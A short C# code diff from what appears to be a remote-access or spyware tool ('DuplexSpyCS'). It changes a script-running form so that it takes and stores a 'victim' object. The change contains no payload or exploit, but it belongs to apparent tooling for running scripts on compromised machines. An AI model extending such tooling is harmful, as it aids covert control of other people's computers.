@@ -17,9 +17,11 @@ namespace DuplexSpyCS
 
         private TextEditorControl editor_code;
 
-        public frmRunScript()
+        public frmRunScript(clsVictim victim)
         {
             InitializeComponent();
+
+            v = victim;
         }
 
         public void DisplayOutput(int code, string output)
